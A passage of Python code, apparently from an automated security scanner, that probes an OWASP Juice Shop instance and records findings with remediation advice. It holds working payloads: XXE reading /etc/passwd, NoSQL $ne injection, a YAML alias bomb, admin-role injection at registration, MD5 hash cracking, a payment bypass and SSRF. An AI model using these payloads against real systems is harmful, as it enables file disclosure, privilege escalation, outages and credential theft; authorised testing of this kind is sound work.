                        "title": "Deluxe membership workflow bypass signal",
                        "severity": "high",
                        "summary": "Deluxe membership upgrade endpoint accepted a direct request with no explicit payment proof.",
                        "evidence": f"`POST {origin}/rest/deluxe-membership` returned upgrade markers. Artifact: {artifact}",
                        "reproduction": f"POST {origin}/rest/deluxe-membership with an authenticated customer token and empty body.",
                        "remediation": "Enforce server-side payment and entitlement verification before role or membership upgrades.",
                        "confidence": 0.82,
                    }
                )
                mark_coverage(
                    [
                        "juice.broken_access_control",
                        "owasp2025.a01_broken_access_control",
                        "api2023.api5_bfla",
                        "api2023.api6_sensitive_business_flows",
                    ],
                    "validated",
                    "Deluxe membership workflow bypass signal validated.",
                )

            # Token replay signal after attempted logout.
            request("POST", f"{origin}/rest/user/logout", timeout=5, headers=auth_headers)
            whoami_resp = request("GET", f"{origin}/rest/user/whoami", timeout=5, headers=auth_headers)
            if int(whoami_resp.get("status") or 0) == 200 and "user" in str(whoami_resp.get("body") or "").lower():
                artifact = self._write_http_artifact(out_dir, "rest-user-whoami-after-logout", whoami_resp, f"{origin}/rest/user/whoami")
                artifacts.append(str(artifact))
                add_finding(
                    {
                        "title": "Session token replay signal after logout",
                        "severity": "high",
                        "summary": "Bearer token remained usable after logout attempt, indicating weak server-side token invalidation controls.",
                        "evidence": f"`GET {origin}/rest/user/whoami` remained accessible with the same token after logout attempt. Artifact: {artifact}",
                        "reproduction": "Authenticate, attempt logout, then re-use the same token on whoami/profile endpoint.",
                        "remediation": "Implement token revocation or short-lived tokens with rotation and server-side invalidation checks.",
                        "confidence": 0.79,
                    }
                )
                mark_coverage(
                    [
                        "juice.broken_authentication",
                        "juice.cryptographic_issues",
                        "owasp2025.a07_authentication_failures",
                        "api2023.api2_broken_authentication",
                    ],
                    "validated",
                    "Token replay-after-logout signal validated.",
                )

            whoami_fields = request(
                "GET",
                f"{origin}/rest/user/whoami?fields=id,email,role,deluxeToken,password",
                timeout=6,
                headers=auth_headers,
            )
            whoami_fields_body = str(whoami_fields.get("body") or "")
            hash_match = re.search(r'"password"\s*:\s*"([0-9a-f]{32,128})"', whoami_fields_body, flags=re.IGNORECASE)
            if int(whoami_fields.get("status") or 0) == 200 and hash_match:
                hash_artifact = self._write_http_artifact(
                    out_dir,
                    "rest-user-whoami-password-hash-leak",
                    whoami_fields,
                    f"{origin}/rest/user/whoami?fields=id,email,role,deluxeToken,password",
                )
                artifacts.append(str(hash_artifact))
                add_finding(
                    {
                        "title": "Authenticated API response exposes password hash field",
                        "severity": "high",
                        "summary": "Profile endpoint returned password hash material to an authenticated client session.",
                        "evidence": f"`GET {origin}/rest/user/whoami?fields=id,email,role,deluxeToken,password` exposed hash data. Artifact: {hash_artifact}",
                        "reproduction": "Authenticate, request whoami with explicit fields including password, and inspect response JSON.",
                        "remediation": "Never serialize password/passwordHash fields in API responses; enforce strict DTO allowlists.",
                        "confidence": 0.91,
                    }
                )
                mark_coverage(
                    [
                        "juice.sensitive_data_exposure",
                        "juice.cryptographic_issues",
                        "owasp2025.a04_cryptographic_failures",
                        "api2023.api3_bopla",
                    ],
                    "validated",
                    "Password hash field exposure validated in whoami response.",
                )

                leaked_hash = hash_match.group(1).lower()
                for candidate in ("admin123", "ncc-1701", "demo", "private", "password", "123456"):
                    if hashlib.md5(candidate.encode("utf-8")).hexdigest() == leaked_hash:
                        add_finding(
                            {
                                "title": "Weak MD5 password hash cracking signal",
                                "severity": "high",
                                "summary": "Leaked password hash was crackable with a short common-password dictionary.",
                                "evidence": f"Leaked hash matched dictionary candidate `{candidate}`.",
                                "reproduction": "Hash common candidate passwords with MD5 and compare against leaked value.",
                                "remediation": "Use adaptive password hashing (Argon2id/bcrypt/scrypt) with per-user salts and secret pepper controls.",
                                "confidence": 0.89,
                            }
                        )
                        mark_coverage(
                            [
                                "juice.cryptographic_issues",
                                "juice.broken_authentication",
                                "owasp2025.a04_cryptographic_failures",
                                "api2023.api2_broken_authentication",
                            ],
                            "validated",
                            "Weak MD5 hash crackability signal validated with dictionary candidate.",
                        )
                        break

            reviews_patch: dict[str, str | int] = {"status": 0, "headers": "", "body": ""}
            if not should_skip_high_risk("High Risk Surfaces: NoSQL operator injection review mutation", ["state-mutation"]):
                reviews_patch = request(
                    "PATCH",
                    f"{origin}/rest/products/reviews",
                    json_body={"id": {"$ne": -1}, "message": "vantix validation marker"},
                    timeout=7,
                    headers=auth_headers,
                )
            reviews_body_l = str(reviews_patch.get("body") or "").lower()
            if int(reviews_patch.get("status") or 0) == 200 and any(marker in reviews_body_l for marker in ("modified", "\"message\"", "review")):
                reviews_artifact = self._write_http_artifact(
                    out_dir,
                    "rest-products-reviews-nosql-operator",
                    reviews_patch,
                    f"{origin}/rest/products/reviews",
                    request_body={"id": {"$ne": -1}, "message": "vantix validation marker"},
                )
                artifacts.append(str(reviews_artifact))
                add_finding(
                    {
                        "title": "NoSQL operator injection signal: PATCH /rest/products/reviews",
                        "severity": "high",
                        "summary": "Object-operator input in review update was accepted, indicating missing operator sanitization.",
                        "evidence": f"`PATCH {origin}/rest/products/reviews` accepted `$ne` operator-style payload. Artifact: {reviews_artifact}",
                        "reproduction": "PATCH review endpoint using object/operator input in id selector.",
                        "remediation": "Enforce strict schema validation for scalar fields and block operator objects in update selectors.",
                        "confidence": 0.86,
                    }
                )
                mark_coverage(
                    [
                        "juice.injection",
                        "juice.improper_input_validation",
                        "owasp2025.a05_injection",
                        "api2023.api10_unsafe_api_consumption",
                    ],
                    "validated",
                    "NoSQL operator injection signal validated on reviews endpoint.",
                )

            upload_headers = self._auth_headers(auth_token) or None
            xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
"""
            xxe_resp: dict[str, str | int] = {"status": 0, "headers": "", "body": ""}
            if not should_skip_high_risk("High Risk Surfaces: XXE local file read", ["server-local-read"]):
                xxe_resp = self._http_multipart_request(
                    "POST",
                    f"{origin}/file-upload",
                    field_name="file",
                    filename="vantix-xxe.xml",
                    content=xxe_payload.encode("utf-8"),
                    content_type="application/xml",
                    timeout=8,
                    headers=upload_headers,
                )
            xxe_body_l = str(xxe_resp.get("body") or "").lower()
            if any(marker in xxe_body_l for marker in ("root:x:0:0", "nobody:x:", "/bin/", "/sbin/nologin")):
                xxe_artifact = self._write_http_artifact(out_dir, "file-upload-xxe", xxe_resp, f"{origin}/file-upload")
                artifacts.append(str(xxe_artifact))
                add_finding(
                    {
                        "title": "XXE file disclosure signal: POST /file-upload",
                        "severity": "high",
                        "summary": "XML upload processing resolved external entities and exposed host file content markers.",
                        "evidence": f"`POST {origin}/file-upload` with XML entity payload returned filesystem markers. Artifact: {xxe_artifact}",
                        "reproduction": "Upload XML containing external entity reference to a local file and inspect response.",
                        "remediation": "Disable external entity resolution and DTD processing for all XML parsers.",
                        "confidence": 0.86,
                    }
                )
                mark_coverage(
                    [
                        "juice.xxe",
                        "juice.injection",
                        "owasp2025.a05_injection",
                        "api2023.api10_unsafe_api_consumption",
                    ],
                    "validated",
                    "XXE signal validated via XML upload probe.",
                )

            yaml_payload = "a: &a [\"x\",\"x\",\"x\",\"x\",\"x\"]\nb: &b [*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b]\n"
            yaml_resp: dict[str, str | int] = {"status": 0, "headers": "", "body": ""}
            if not should_skip_high_risk("High Risk Surfaces: YAML parser resource exhaustion", ["availability-impact"]):
                yaml_resp = self._http_multipart_request(
                    "POST",
                    f"{origin}/file-upload",
                    field_name="file",
                    filename="vantix-bomb.yml",
                    content=yaml_payload.encode("utf-8"),
                    content_type="application/x-yaml",
                    timeout=8,
                    headers=upload_headers,
                )
            yaml_body_l = str(yaml_resp.get("body") or "").lower()
            if int(yaml_resp.get("status") or 0) >= 500 or any(marker in yaml_body_l for marker in ("rangeerror", "maximum call stack", "out of memory", "alias")):
                yaml_artifact = self._write_http_artifact(out_dir, "file-upload-yaml-bomb", yaml_resp, f"{origin}/file-upload")
                artifacts.append(str(yaml_artifact))
                add_finding(
                    {
                        "title": "YAML parser resource-exhaustion signal: POST /file-upload",
                        "severity": "medium",
                        "summary": "YAML anchor/alias payload triggered parser instability or server error behavior.",
                        "evidence": f"`POST {origin}/file-upload` with nested YAML anchors returned parser/availability error signals. Artifact: {yaml_artifact}",
                        "reproduction": "Upload nested YAML alias payload and observe parser response stability.",
                        "remediation": "Use safe YAML parser configuration, enforce depth/size limits, and reject alias-heavy payloads.",
                        "confidence": 0.78,
                    }
                )
                mark_coverage(
                    [
                        "juice.insecure_deserialization",
                        "juice.improper_input_validation",
                        "owasp2025.a10_exception_handling",
                        "api2023.api4_resource_consumption",
                    ],
                    "validated",
                    "YAML parser resource exhaustion signal validated.",
                )

        # Registration workflow abuse checks (admin role injection and over-permissive product creation).
        users_post_exists = True
        if users_post_exists:
            unique = str(int(time.time() * 1000))
            regular_email = f"vantix-user-{unique}@example.invalid"
            regular_password = "Vantix!12345"
            reg_payload = {
                "email": regular_email,
                "password": regular_password,
                "passwordRepeat": regular_password,
                "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2024-01-01", "updatedAt": "2024-01-01"},
                "securityAnswer": "test",
            }
            request("POST", f"{origin}/api/Users", json_body=reg_payload, timeout=6)
            user_login = request("POST", f"{origin}/rest/user/login", json_body={"email": regular_email, "password": regular_password}, timeout=6)
            regular_token = self._extract_bearer_token(user_login)
            if regular_token:
                product_resp: dict[str, str | int] = {"status": 0, "headers": "", "body": ""}
                if not should_skip_high_risk("High Risk Surfaces: regular user product creation", ["state-mutation", "authz-bypass"]):
                    product_resp = request(
                        "POST",
                        f"{origin}/api/Products",
                        json_body={"name": f"Vantix Test Product {unique}", "description": "authorization check", "price": 9.99, "image": "x.jpg"},
                        timeout=6,
                        headers={"Authorization": f"Bearer {regular_token}"},
                    )
                if int(product_resp.get("status") or 0) in {200, 201} and "name" in str(product_resp.get("body") or "").lower():
                    artifact = self._write_http_artifact(
                        out_dir,
                        "api-Products-post-regular-user",
                        product_resp,
                        f"{origin}/api/Products",
                        request_body={"name": f"Vantix Test Product {unique}", "description": "authorization check", "price": 9.99, "image": "x.jpg"},
                    )
                    artifacts.append(str(artifact))
                    add_finding(
                        {
                            "title": "Regular user product creation authorization signal",
                            "severity": "high",
                            "summary": "Product creation endpoint accepted a non-admin token, indicating missing role enforcement.",
                            "evidence": f"`POST {origin}/api/Products` returned success for a regular account. Artifact: {artifact}",
                            "reproduction": "Register/login as regular user and POST to product creation endpoint.",
                            "remediation": "Restrict product-management endpoints to privileged roles with server-side policy checks.",
                            "confidence": 0.85,
                        }
                    )
                    mark_coverage(
                        [
                            "juice.broken_access_control",
                            "owasp2025.a01_broken_access_control",
                            "api2023.api5_bfla",
                        ],
                        "validated",
                        "Regular-user product creation authorization signal validated.",
                    )

                regular_headers = self._auth_headers(regular_token)
                deluxe_resp = {"status": 0, "headers": "", "body": ""}
                if not should_skip_high_risk("High Risk Surfaces: regular-user deluxe membership upgrade", ["state-mutation", "authz-bypass"]):
                    deluxe_resp = request("POST", f"{origin}/rest/deluxe-membership", json_body={}, timeout=6, headers=regular_headers)
                deluxe_body = str(deluxe_resp.get("body") or "").lower()
                if int(deluxe_resp.get("status") or 0) == 200 and ("deluxe" in deluxe_body or "token" in deluxe_body):
                    artifact = self._write_http_artifact(out_dir, "rest-deluxe-membership", deluxe_resp, f"{origin}/rest/deluxe-membership", request_body={})
                    artifacts.append(str(artifact))
                    add_finding(
                        {
                            "title": "Deluxe membership workflow bypass signal",
                            "severity": "high",
                            "summary": "Deluxe membership upgrade endpoint accepted a direct request from a regular user without explicit payment proof.",
                            "evidence": f"`POST {origin}/rest/deluxe-membership` returned upgrade markers for a regular account. Artifact: {artifact}",
                            "reproduction": "Register/login as regular user, then POST an empty JSON body to `/rest/deluxe-membership`.",
                            "remediation": "Enforce server-side payment and entitlement verification before role or membership upgrades.",
                            "confidence": 0.86,
                        }
                    )
                    mark_coverage(
                        [
                            "juice.broken_access_control",
                            "owasp2025.a01_broken_access_control",
                            "api2023.api5_bfla",
                            "api2023.api6_sensitive_business_flows",
                        ],
                        "validated",
                        "Deluxe membership workflow bypass signal validated with a regular account.",
                    )

            admin_email = f"vantix-admin-{unique}@example.invalid"
            role_payload = {
                "email": admin_email,
                "password": "Vantix!12345",
                "passwordRepeat": "Vantix!12345",
                "role": "admin",
                "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2024-01-01", "updatedAt": "2024-01-01"},
                "securityAnswer": "test",
            }
            role_resp: dict[str, str | int] = {"status": 0, "headers": "", "body": ""}
            if not should_skip_high_risk("High Risk Surfaces: admin role injection during registration", ["state-mutation", "authz-bypass"]):
                role_resp = request("POST", f"{origin}/api/Users", json_body=role_payload, timeout=6)
            role_body = str(role_resp.get("body") or "").lower()
            if int(role_resp.get("status") or 0) in {200, 201} and "\"role\"" in role_body and "admin" in role_body:
                artifact = self._write_http_artifact(out_dir, "api-Users-role-admin", role_resp, f"{origin}/api/Users", request_body=role_payload)
                artifacts.append(str(artifact))
                add_finding(
                    {
                        "title": "Admin role injection during registration",
                        "severity": "critical",
                        "summary": "Registration accepted a client-supplied admin role value.",
                        "evidence": f"`POST {origin}/api/Users` reflected/admin-confirmed elevated role assignment. Artifact: {artifact}",
                        "reproduction": "POST registration payload including `\"role\":\"admin\"` and observe successful privileged account creation.",
                        "remediation": "Ignore client-supplied role fields and assign default least-privilege roles server-side only.",
                        "confidence": 0.92,
                    }
                )
                mark_coverage(
                    [
                        "juice.broken_access_control",
                        "owasp2025.a01_broken_access_control",
                        "api2023.api3_bopla",
                        "api2023.api5_bfla",
                    ],
                    "validated",
                    "Admin role injection during registration validated.",
                )

        # SSRF method-bypass validation for URL-ingestion endpoints.
        for path in upload_or_url_paths[:12]:
            ssrf_payload = {"imageUrl": f"{origin}/rest/admin/application-version"}
            ssrf_responses = [
                ("POST", request("POST", f"{origin}{path}", json_body=ssrf_payload, timeout=6, headers=auth_headers)),
                ("PUT", request("PUT", f"{origin}{path}", json_body=ssrf_payload, timeout=6, headers=auth_headers)),
                ("PATCH", request("PATCH", f"{origin}{path}", json_body=ssrf_payload, timeout=6, headers=auth_headers)),
            ]
            best_method = ""
            best_resp: dict[str, str | int] | None = None
            for method, resp in ssrf_responses:
                body_l = str(resp.get("body") or "").lower()
                if int(resp.get("status") or 0) == 200 and any(marker in body_l for marker in ("version", "juice", "application", "owasp juice shop")):
                    best_method = method
                    best_resp = resp
                    break
            if best_resp is not None:
                artifact = self._write_http_artifact(out_dir, f"{path}-ssrf-internal-fetch", best_resp, f"{origin}{path}", request_body=ssrf_payload)
                artifacts.append(str(artifact))
                add_finding(
                    {
                        "title": f"SSRF internal fetch signal: {path}",
                        "severity": "high",
                        "summary": "URL-ingestion endpoint accepted an internal application URL and returned internal-fetch response markers.",
                        "evidence": f"`{best_method} {origin}{path}` with internal `imageUrl` returned application markers. Artifact: {artifact}",
                        "reproduction": f"{best_method} {origin}{path} with `imageUrl` pointing to `{origin}/rest/admin/application-version`.",
                        "remediation": "Block private/link-local/internal destinations, enforce strict URL allowlists, and apply identical validation across HTTP methods.",
                        "confidence": 0.82,
                    }
                )
                mark_coverage(
                    [
                        "juice.broken_access_control",
                        "juice.improper_input_validation",
                        "owasp2025.a01_broken_access_control",
                        "owasp2025.a05_injection",
                        "api2023.api7_ssrf",
                    ],
                    "validated",
                    f"SSRF internal-fetch signal validated for `{path}`.",
                )

        coverage_checks = [
            {"id": key, "framework": row["framework"], "label": row["label"], "status": row["status"], "evidence": row["evidence"]}
            for key, row in sorted(coverage_matrix.items(), key=lambda item: item[0])
        ]
        return {"findings": findings, "artifacts": artifacts, "coverage_checks": coverage_checks, "validation_attempts": validation_attempts}

    def _endpoint_paths(self, network_endpoints: list[dict]) -> dict[str, set[str]]:
        endpoints: dict[str, set[str]] = {}
        for row in network_endpoints or []:
            raw = str((row or {}).get("endpoint") or "").strip()
            if not self._is_meaningful_endpoint(raw):
                continue
            method, path = raw.split(" ", 1)
            endpoints.setdefault(method.upper(), set()).add(path.strip())
        return endpoints

    def _append_query(self, path: str, params: dict[str, str]) -> str:
        sep = "&" if "?" in path else "?"
        return f"{path}{sep}{urlencode(params)}"

    def _script_paths_from_html(self, html: str) -> list[str]:
        paths: list[str] = []
        for match in re.findall(r"""<script[^>]+src=["']([^"']+)["']""", html or "", flags=re.IGNORECASE):
            value = str(match or "").strip()
            if not value or value.startswith(("data:", "javascript:")):
                continue
            paths.append(value)
        for match in re.findall(r"""["']((?:/)?(?:assets/|main|runtime|polyfills|scripts)[^"']+\.js)["']""", html or "", flags=re.IGNORECASE):
            value = str(match or "").strip()
            if value:
                paths.append(value)
        deduped: list[str] = []
        seen: set[str] = set()
        for item in paths:
            key = item.strip()
            if not key or key in seen:
                continue
            seen.add(key)
            deduped.append(key)
        return deduped[:50]

    def _script_paths_from_js(self, body: str) -> list[str]:
        paths: list[str] = []
        for pattern in (
            r"""from["']([^"']+\.js)["']""",
            r"""import\(["']([^"']+\.js)["']\)""",
            r"""["']((?:\.?/)?(?:chunk-|main|runtime|polyfills|scripts)[^"']+\.js)["']""",
        ):
            for match in re.findall(pattern, body or "", flags=re.IGNORECASE):
                value = str(match or "").strip()
                if value and not value.startswith(("data:", "javascript:")):
                    paths.append(value)
        deduped: list[str] = []
        seen: set[str] = set()
        for item in paths:
            if item in seen:
                continue
            seen.add(item)
            deduped.append(item)
        return deduped[:80]

    def _first_artifact_path(self, text: str) -> str:
        match = re.search(r"Artifact:\s*(/\S+)", str(text or ""))
        if not match:
            match = re.search(r"(/\S+/artifacts/\S+)", str(text or ""))
        if not match:
            return ""
        return match.group(1).rstrip(".,);]'\"")

    def _auth_headers(self, token: str | None) -> dict[str, str]:
        value = str(token or "").strip()
        if not value:
            return {}
        return {"Authorization": f"Bearer {value}", "Cookie": f"token={value}"}

    def _is_black_box_run(self, run: WorkspaceRun) -> bool:
        cfg = dict(run.config_json or {})
        source_ctx = dict(cfg.get("source_context") or {})
        source_input = dict(cfg.get("source_input") or {})
        source_type = str(source_input.get("type") or "").strip().lower()
        source_status = str(source_ctx.get("status") or "").strip().lower()
        resolved_path = str(source_ctx.get("resolved_path") or "").strip()
        if source_type and source_type not in {"none", "no-source"}:
            return False
        if source_status and source_status not in {"", "skipped", "none"}:
            return False
        if resolved_path:
            return False
        return True

    def _is_oracle_endpoint_path(self, path: str) -> bool:
        lowered = str(path or "").strip().lower()
        if not lowered:
            return False
        for marker in ORACLE_ENDPOINT_MARKERS:
            if marker in lowered:
                return True
        return False

    def _looks_like_spa_html(self, response: dict[str, str | int]) -> bool:
        headers = str(response.get("headers") or "").lower()
        body = str(response.get("body") or "").lower()[:1200]
        return "content-type: text/html" in headers and ("<!doctype html" in body or "<html" in body)

    def _extract_bearer_token(self, response: dict[str, str | int]) -> str | None:
        body = str(response.get("body") or "").strip()
        if not body:
            return None
        try:
            payload = json.loads(body)
        except Exception:  # noqa: BLE001
            return None
        if isinstance(payload, dict):
            auth = payload.get("authentication")
            if isinstance(auth, dict):
                token = auth.get("token")
                if isinstance(token, str) and token.strip():
                    return token.strip()
            token = payload.get("token")
            if isinstance(token, str) and token.strip():
                return token.strip()
        return None

    def _parse_header_map(self, raw_headers: str) -> dict[str, str]:
        parsed: dict[str, str] = {}
        for line in str(raw_headers or "").splitlines():
            if ":" not in line:
                continue
            key, value = line.split(":", 1)
            parsed[key.strip().lower()] = value.strip()
        return parsed

    def _is_meaningful_endpoint(self, endpoint: str) -> bool:
        value = str(endpoint or "").strip()
        if not value:
            return False
        parts = value.split(" ", 1)
        if len(parts) != 2:
            return False
        method, path = parts[0].upper().strip(), parts[1].strip()
        if not path.startswith("/"):
            return False
        if method not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
            return False
        lower = path.lower()
        if self._is_oracle_endpoint_path(lower):
            return False
        noisy_prefixes = (
            "/assets/",
            "/dist/",
            "/static/",
            "/socket.io/",
            "/github/collect",
            "/favicon",
        )
        if any(lower.startswith(prefix) for prefix in noisy_prefixes):
            return False
        noisy_suffixes = (
            ".css",
            ".js",
            ".mjs",
            ".map",
            ".png",
            ".jpg",
            ".jpeg",
            ".gif",
            ".svg",
            ".webp",
            ".ico",
            ".woff",
            ".woff2",
            ".ttf",
            ".eot",
        )
        if lower.endswith(noisy_suffixes):
            return False
        if "/images/uploads/" in lower:
            return False
        return True
